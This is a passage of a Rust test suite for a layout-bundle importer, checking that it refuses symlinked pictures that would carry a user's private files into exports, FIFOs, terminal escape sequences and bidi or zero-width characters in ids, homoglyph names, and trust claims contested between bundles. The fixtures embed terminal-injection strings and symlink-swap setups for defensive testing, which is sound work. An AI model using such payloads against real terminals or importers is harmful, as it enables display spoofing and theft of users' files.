        assert_eq!(about("layouts/big.toml"), "finding.bundle_too_large");
        assert_eq!(about("components"), "finding.bundle_link");

        let piped = report_of(read_in_time(&dir.join("manifest-pipe")));
        assert!(
            piped
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.bundle_not_plain")),
            "{}",
            piped.render()
        );
    }

    fn report_of(read: Result<Bundle, util::report::Report>) -> util::report::Report {
        read.expect_err("refused")
    }

    /// A bundle in `dir` whose one layout names the picture `assets/wall.png`.
    fn painted_bundle(dir: &Path) {
        written(dir, "manifest.toml", "name = \"walled\"\n");
        written(
            dir,
            "layouts/walled.toml",
            "[[outputs]]\nmatch = \"*\"\n[[outputs.layers.background.areas]]\nid = \"wall\"\nkind = \"wallpaper_region\"\nsource = \"assets/wall.png\"\n",
        );
    }

    /// A picture that is a link would carry whatever the importing user can read into a directory the next export shares: refused. What the layouts do not name is never opened, a FIFO among them included.
    #[test]
    fn a_picture_that_is_a_link_is_refused_and_unnamed_files_are_never_read() {
        let dir = scratch("linked-picture");
        painted_bundle(&dir);
        let secret = picture(&scratch("linked-picture-home"), "secret.png", b"private");
        std::fs::create_dir_all(dir.join("assets")).unwrap();
        std::os::unix::fs::symlink(&secret, dir.join("assets/wall.png")).unwrap();
        let report = read_in_time(&dir).expect_err("refused");
        let finding = report
            .errors
            .iter()
            .find(|finding| finding.message.key() == Some("finding.bundle_link"))
            .unwrap_or_else(|| panic!("{}", report.render()));
        assert_eq!(finding.file, dir.join("layouts/walled.toml"));
        assert_eq!(finding.key, "outputs.*.layers.background.areas.wall.source");

        std::fs::remove_file(dir.join("assets/wall.png")).unwrap();
        picture(&dir.join("assets"), "wall.png", b"pixels");
        picture(&dir.join("assets"), "unnamed.bin", b"never read");
        fifo(&dir.join("assets/pipe.png"));
        let read = read_in_time(&dir).unwrap_or_else(|report| panic!("{}", report.render()));
        assert_eq!(read.assets.keys().collect::<Vec<_>>(), ["wall.png"]);
    }

    /// Export never follows a link either: a picture the layout names through one is a finding, not the file it points at.
    #[test]
    fn export_never_carries_a_picture_through_a_link() {
        let dir = scratch("export-link");
        let real = picture(&dir.join("real"), "wall.png", b"pixels");
        let link = dir.join("wall.png");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let (base, shared) = painted(&link, &real);
        let refused = bundle::export(&LayoutId::new("shared"), &library([base, shared]))
            .expect_err("a link is not carried");
        assert!(
            refused
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.bundle_link")),
            "{}",
            refused.render()
        );
    }

    /// A file two bundles claim is neither's: nothing in it runs, no answer can be recorded for it, and resolution says so as an error rather than letting the last record win.
    #[test]
    fn a_file_two_bundles_claim_runs_nothing_and_says_so() {
        let mut library = imported(library([parsed("shared", SHARED)]));
        library.trust.import("layouts/shared.toml", "other");
        let shared = library.layouts[&LayoutId::new("shared")].clone();
        let items: Vec<Item> = all_items(&library)
            .into_iter()
            .filter(|item| item.file == "layouts/shared.toml")
            .collect();
        for item in &items {
            assert!(!library.trust.decide(item, true), "no bundle to answer for");
        }
        assert!(
            items
                .iter()
                .all(|item| library.trust.verdict(item) == Verdict::Pending)
        );
        let (resolved, _) = resolve(&shared, &library, NOMINAL_OUTPUT, None);
        assert_eq!(bar_press(&resolved), ["launcher toggle"]);
        let report = held(&shared, &library);
        assert!(
            report
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.trust_contested")),
            "{}",
            report.render()
        );
    }

    /// An answer is the bundle's that was asked: the same file and text under another bundle waits again.
    #[test]
    fn answers_belong_to_the_bundle_that_gave_them() {
        let item = Item {
            file: "layouts/shared.toml".to_string(),
            key: "sources.weather.cmd".to_string(),
            kind: ItemKind::Poll,
            text: "curl -s wttr.in".to_string(),
            lock_safe: false,
        };
        let mut first = Trust::with_rule(shows);
        first.import(&item.file, "first");
        first.recall("first", &item.file, &item.key, &item.text, false, true);
        assert_eq!(first.verdict(&item), Verdict::Accepted);

        let mut later = Trust::with_rule(shows);
        later.import(&item.file, "later");
        later.recall("first", &item.file, &item.key, &item.text, false, true);
        assert_eq!(later.verdict(&item), Verdict::Pending);
    }

    /// A lock promise is part of the text a copy is judged by: the user's file already fetching an address off the lock screen does not make the bundle's lock-safe fetch of it the user's to copy.
    #[test]
    fn a_copy_that_starts_promising_the_lock_screen_is_carried() {
        let library = imported(library([parsed("shared", SHARED)]));
        let own = |lock_safe| Item {
            file: "layouts/mine.toml".to_string(),
            key: "sources.feed.url".to_string(),
            kind: ItemKind::Http,
            text: "https://example.com/feed".to_string(),
            lock_safe,
        };
        assert_eq!(
            carried(&library, "layouts/mine.toml", &[own(false)], &[own(false)]),
            None,
            "what the file ran stays the user's"
        );
        let refused = carried(&library, "layouts/mine.toml", &[own(false)], &[own(true)])
            .expect("the promise is the bundle's, and not trusted");
        assert!(refused.item.lock_safe);
        assert_eq!(refused.item.file, "layouts/shared.toml");
    }

    /// An id holding a terminal escape would rewrite the terminal a finding about it is printed on: a bundle carrying one is refused at read, saying where, and the finding renders it written out.
    #[test]
    fn an_id_with_a_terminal_escape_is_refused_at_read() {
        let dir = scratch("escaped-id");
        written(&dir, "manifest.toml", "name = \"nord\"\n");
        written(
            &dir,
            "layouts/nord.toml",
            "[[outputs]]\nmatch = \"*\"\n[[outputs.layers.top.areas]]\nid = \"bar\\u001b[2J\\u001b]0;owned\\u0007\"\nkind = \"bar\"\nedge = \"top\"\nthickness = 30.0\n",
        );
        written(
            &dir,
            "components/pill.toml",
            "[[children]]\nid = \"le\\u200bvel\"\nmodule = \"battery\"\n",
        );
        let report = bundle::read(&dir).expect_err("refused");
        let unreadable: Vec<&util::report::Finding> = report
            .errors
            .iter()
            .filter(|finding| finding.message.key() == Some("finding.unreadable_name"))
            .collect();
        assert_eq!(unreadable.len(), 2, "{}", report.render());
        assert_eq!(unreadable[0].file, dir.join("layouts/nord.toml"));
        assert_eq!(unreadable[1].file, dir.join("components/pill.toml"));
        let rendered = report.render();
        assert!(
            !rendered.contains('\u{1b}') && !rendered.contains('\u{7}'),
            "{rendered}"
        );
        assert!(rendered.contains("bar\\u{1b}[2J"), "{rendered}");
    }

    /// The same id in a layout of the user's own is a validation error: an id is a readable identifier wherever it is written (F-10.3). A layout's `name` may hold an emoji, joiner included, and no control character.
    #[test]
    fn an_unreadable_id_is_a_validation_error_in_any_layout() {
        let mut layout = parsed("mine", SHARED);
        layout.name = "Nord 👩‍💻".to_string();
        layout.outputs[0].layers.top.areas[0].id = AreaId::new("bar\u{202e}");
        let report = validate(&layout, &Anything);
        let found: Vec<(&str, Option<&str>)> = report
            .errors
            .iter()
            .map(|finding| (finding.key.as_str(), finding.message.key()))
            .filter(|(_, key)| key.is_some_and(|key| key.starts_with("finding.unreadable")))
            .collect();
        assert_eq!(
            found,
            [(
                "outputs.*.layers.top.areas.bar\u{202e}",
                Some("finding.unreadable_name")
            )]
        );
        layout.name = "Nord\u{1b}[31m".to_string();
        assert!(
            validate(&layout, &Anything)
                .errors
                .iter()
                .any(|finding| finding.key == "name"
                    && finding.message.key() == Some("finding.unreadable_display_name"))
        );
    }

    /// A bundle's name, and the names of the files it carries, are lowercase ASCII: `nоrd` with a Cyrillic `о` cannot pass for `nord`, nor `Nord` for it in a font where they look alike.
    #[test]
    fn a_name_in_another_script_is_refused() {
        assert!(is_komponent_name("nord-2_dark"));
        for name in ["n\u{43e}rd", "Nord", "nörd", "a b", "", "x.y"] {
            assert!(!is_komponent_name(name), "`{name}`");
        }
        let dir = scratch("homoglyph");
        written(&dir, "manifest.toml", "name = \"n\u{43e}rd\"\n");
        written(&dir, "layouts/n\u{43e}rd.toml", "");
        let report = bundle::read(&dir).expect_err("refused");
        let keys: Vec<Option<&str>> = report.errors.iter().map(|it| it.message.key()).collect();
        assert!(keys.contains(&Some("finding.bundle_name")), "{keys:?}");
        assert!(keys.contains(&Some("finding.bundle_file_name")), "{keys:?}");
    }

    /// The directory of pictures swapped for a link once the bundle was read redirects nothing: what is copied in is what was read, from the directory opened then.
    #[test]
    fn a_picture_directory_swapped_for_a_link_after_the_read_redirects_nothing() {
        let dir = scratch("swapped-assets");
        painted_bundle(&dir);
        picture(&dir.join("assets"), "wall.png", b"pixels");
        let read = bundle::read(&dir).unwrap_or_else(|report| panic!("{}", report.render()));
        let home = scratch("swapped-assets-home");
        picture(&home, "wall.png", b"the user's key");
        std::fs::rename(dir.join("assets"), dir.join("moved")).unwrap();
        std::os::unix::fs::symlink(&home, dir.join("assets")).unwrap();
        assert_eq!(read.assets["wall.png"].read().unwrap(), b"pixels");

        let report = bundle::read(&dir).expect_err("a link where `assets` is");
        assert!(
            report
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.bundle_link")),
            "{}",
            report.render()
        );
    }
}
